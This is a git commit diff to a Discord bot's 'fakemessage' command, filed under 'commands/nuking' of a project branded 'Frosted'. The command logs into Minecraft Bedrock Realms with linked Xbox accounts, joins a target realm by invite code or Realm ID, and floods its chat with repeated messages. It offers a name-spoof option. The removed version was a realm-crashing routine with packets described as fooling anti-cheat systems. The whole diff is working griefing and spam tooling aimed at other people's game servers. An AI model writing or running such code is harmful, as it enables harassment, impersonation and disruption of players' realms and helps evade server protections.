e3e4f7104121f0ad0aef8115f0ef0d625ef67264
TSL534 <166989673+TSL534@users.noreply.github.com>
2025-01-16 21:05:26 +0100

    Multi Link and Realm ID support for Fake Message

--- commands/nuking/fakemessage.js
+++ commands/nuking/fakemessage.js
@@ -8,18 +8,27 @@ const { dumprealm } = require('../../men/realms');
 const { NIL, v3: uuidv3, v4: uuidv4 } = require('uuid');
 const { Authflow, Titles } = require("prismarine-auth");
 const skinData = require('../../data/client/jenny.json')
+const crypto = require("node:crypto");
+const curve = "secp384r1";
+const keypair = crypto.generateKeyPairSync("ec", { namedCurve: curve }).toString("base64");
 
 module.exports = {
     data: new SlashCommandBuilder()
         .setName("fakemessage")
-        .setIntegrationTypes(0, 1)
-        .setContexts(0, 1, 2)
-        .setDescription("Crash a realm")
+        .setDescription("Send's a Fake Messages of a Player with Name Spoof Support")
+        .addIntegerOption(option =>
+            option.setName('account')
+                .setDescription('Account you wanna use')
+                .setRequired(true)
+                .addChoices(
+                    { name: 'Account 1', value: 1 },
+                    { name: 'Account 2', value: 2 },
+                    { name: 'Account 3', value: 3 }))
         .addStringOption(option =>
             option.setName('invite')
-                .setDescription('Realm invite code')
+                .setDescription('Realm invite code or Realm ID')
                 .setRequired(true)
-                .setMinLength(11)
+                .setMinLength(8)
                 .setMaxLength(15))
         .addStringOption(option =>
             option.setName('messages')
@@ -35,11 +44,13 @@ module.exports = {
             option.setName('name')
                 .setDescription('Name Spoof Name.')
                 .setRequired(false)),
+
     async execute(interaction) {
         const invite = interaction.options.getString('invite');
-        const name = interaction.option.getString('name') | "discord.gg/frosted"
-        const messageCount = interaction.option.getString('count');
-        const messagesInput = interaction.option.getString('messages')
+        const name = interaction.options.getString('name') || "discord.gg/frosted";
+        const account = interaction.options.getInteger('account') 
+        const messageCount = interaction.options.getInteger('count');
+        const messagesInput = interaction.options.getString('messages');
         let disconnected = false;
 
         try {
@@ -51,37 +62,34 @@ module.exports = {
                         .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                         .setThumbnail(config.embeds.footerurl)
                         .setColor(config.embeds.color)
-                ],ephemeral: true,
+                ], ephemeral: true,
             });
 
-            if (!fs.existsSync(`./data/client/frosted/${interaction.user.id}`)) {
+            if (!fs.existsSync(`./data/client/frosted/${interaction.user.id}/profile${account}`)) {
                 await interaction.editReply({
                     embeds: [
-                        {
-                            title: `X Account Not Linked X`,
-                            description: `It seems like you haven't linked an account yet.\nPlease link an account whit `+'`/link `' + `to use this command.`,
-                            color: 0xff0000,
-                            footer: { text: "e" },
-                        },
-                    ],
+                        new EmbedBuilder()
+                            .setTitle("X Account Not Linked X")
+                            .setDescription(`It seems like you haven't linked an account yet.\nPlease link an account with \`/link\` to use this command.`)
+                            .setColor(0xff0000)
+                    ]
                 });
                 return;
             }
 
             const whitelist = JSON.parse(fs.readFileSync('./data/client/whitelist.json', 'utf8'));
-        const isWhitelisted = whitelist.some(entry => entry.realmCode === invite);
-        if (isWhitelisted) {
-            return interaction.editReply({
-                embeds: [
-                    new EmbedBuilder()
-                        .setTitle('Frosted Error')
-                        .setDescription(`The invite \`${invite}\` is in the whitelist and cannot be nuked.`)
-                        .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
-                        .setThumbnail(config.embeds.footerurl)
-                        .setColor(config.embeds.color)
-                ]
-            });
-        }
+            if (whitelist.includes(invite)) {
+                return interaction.editReply({
+                    embeds: [
+                        new EmbedBuilder()
+                            .setTitle('Frosted Error')
+                            .setDescription(`The invite \`${invite}\` is in the whitelist and cannot be nuked.`)
+                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
+                            .setThumbnail(config.embeds.footerurl)
+                            .setColor(config.embeds.color)
+                    ]
+                });
+            }
 
             const realm = await dumprealm(invite);
             if (!realm) {
@@ -98,12 +106,9 @@ module.exports = {
                 });
             }
 
-            const crypto = require("node:crypto");
-            const curve = "secp384r1";
-            const keypair = crypto.generateKeyPairSync("ec", { namedCurve: curve }).toString("base64");
             const bot = new Authflow(
-                interaction.user.id, 
-                path.resolve(`./data/client/frosted/${interaction.user.id}`), 
+                interaction.user.id,
+                path.resolve(`./data/client/frosted/${interaction.user.id}/profile${account}`),
                 {
                     flow: 'live',
                     authTitle: 'MinecraftNintendoSwitch',
@@ -111,7 +116,7 @@ module.exports = {
                     doSisuAuth: true
                 }
             );
-            
+
             async function refreshOrRetrieveTokens() {
                 try {
                     const xboxToken = await bot.getXboxToken();
@@ -120,7 +125,7 @@ module.exports = {
                     return xboxToken;
                 } catch (error) {
                     console.error('Error while Refrshing', error);
-                    return interaction.editReply({
+                    await interaction.editReply({
                         embeds: [
                             new EmbedBuilder()
                                 .setTitle("Token Refresh Error")
@@ -142,7 +147,7 @@ module.exports = {
                     
                 } else {
                     console.log('Error Refreshing Token');
-                    return interaction.editReply({
+                    await interaction.editReply({
                         embeds: [
                             new EmbedBuilder()
                                 .setTitle("Token Refresh Error")
@@ -152,11 +157,12 @@ module.exports = {
                                 .setColor(config.embeds.color)
                         ]
                     });
+                    return;
                 }
             })();
 
             const client = createClient({
-                profilesFolder: `./data/client/frosted/${interaction.user.id}`,
+                profilesFolder: `./data/client/frosted/${interaction.user.id}/profile${account}`,
                 username: interaction.user.id,
                 offline: false,
                 realms: {
@@ -194,116 +200,43 @@ module.exports = {
                 });
                 client.disconnect();
             });
-            
-            let runtimeEntityId;
 
-            client.on('start_game', (packet) => { // Small littel Hack to make Bot less Detactebel
-              runtimeEntityId = packet.runtime_entity_id
-              console.log(`Runtime Entity ID: ${runtimeEntityId}`);
+            client.on('spawn', async () => {
+                if (disconnected) return;
+                const messages = messagesInput.split(';');
+
+                for (let i = 0; i < messageCount; i++) {
+                    for (const message of messages) {
+                        client.write("text", {
+                            filtered_message: "",
+                            type: "chat",
+                            needs_translation: false,
+                            source_name: client.profile.name,
+                            message: message,
+                            xuid: "0",
+                            platform_chat_id: "0"
+                        });
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    }
+                }
             });
-            client.on('start_game', (packet) => {
-            client.queue('serverbound_loading_screen', { // sends the "is loading in Packet"
-              "type": 1
-            })
-            client.queue('serverbound_loading_screen', { // Removes the immortal status of the Bot
-              "type": 2
-            })
-            client.queue('interact', {  // Verify the Movement so Server sees us as a Real Player !
-              "action_id": "mouse_over_entity",
-              "target_entity_id": 0n,
-              "position": {
-                "x": 0,
-                "y": 0,
-                "z": 0
-              }
-            })
-            client.queue('set_local_player_as_initialized', { // almost same as the first but mc is goofy and needs more packets, do i know ? nope !
-              "runtime_entity_id": `${runtimeEntityId}`
-            })
-            client.queue("animate", {//  like a spoof to anti cheats :p
-                action_id: 1, // making your arm swing 
-                runtime_entity_id: packet.runtime_entity_id});
-            })
-            client.on('play_status', async (packet) => {
-                console.log(`${colors.green}[Realm Watcher]${colors.cyan}>> User ${interaction.user.username}/${interaction.user.id} join Realm ${realm.name}/${invite}`)
-                const action_packet = {
-                    runtime_entity_id: packet.runtime_entity_id,
-                    position: { x: 0, y: 0, z: 0 },
-                    result_position: { x: 0, y: 0, z: 0 },
-                    face: 0,
-                  };
-                try {
-                    await interaction.editReply({
+
+            setTimeout(() => {
+                if (!disconnected) {
+                    client.disconnect();
+                    interaction.editReply({
                         embeds: [
                             new EmbedBuilder()
-                                .setTitle('Frosted Lag (r)')
-                                .setDescription(`Joined and started to crash ${realm.name} - ${invite}. Disconnecting in 10 seconds...`)
+                                .setTitle('Frosted Spam (r)')
+                                .setDescription(`Client disconnected from ${realm.name}. Spam successful.`)
                                 .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                 .setThumbnail(config.embeds.footerurl)
                                 .setColor(config.embeds.color)
                         ]
                     });
-
-                    client.on('spawn', async () => {
-                        if (disconnected) return;
-                        const messages = messagesInput.split(';');
-                        //console.log(`[Debug]Messages send ${messages} Count= ${messageCount}`)
-        
-                        for (let i = 0; i < messageCount; i++) {
-                            for (const message of messages) {
-                                client.write("text", {
-                                    filtered_message: "",
-                                    type: "chat",
-                                    needs_translation: false,
-                                    source_name: client.profile.name,
-                                    message: message,
-                                    xuid: "0",
-                                    platform_chat_id: "0"
-                                });
-                                //console.log(`[Debug]Sent message ${message}`)
-                                await setTimeout(0); 
-                            }
-                        }
-        
-                    });
-
-                    setTimeout(() => {
-                        if (!disconnected) {
-                            client.disconnect();
-                            interaction.editReply({
-                                embeds: [
-                                    new EmbedBuilder()
-                                        .setTitle('Frosted Lag (r)')
-                                        .setDescription(`Client disconnected from ${realm.name}. Crash successful.`)
-                                        .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
-                                        .setThumbnail(config.embeds.footerurl)
-                                        .setColor(config.embeds.color)
-                                ]
-                            });
-                            disconnected = true;
-                        }
-                    }, 20000);
-                } catch (error) {
-                    console.error(error);
-                    throw error;
+                    disconnected = true;
                 }
-            });
-
-            client.on('close', async (err) => {
-                if (disconnected) return;
-                disconnected = true;
-                console.error(`[${new Date().toLocaleTimeString()}] Client closed: ${err}`);
-                await interaction.editReply({
-                    embeds: [
-                        new EmbedBuilder()
-                            .setTitle('Frosted Error')
-                            .setDescription(`Connection closed. Crash completed.`)
-                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
-                            .setThumbnail(config.embeds.footerurl)
-                            .setColor(config.embeds.color)
-                    ]
-                });
-            });
+            }, 200000);
         } catch (err) {
             console.error(err);
         }
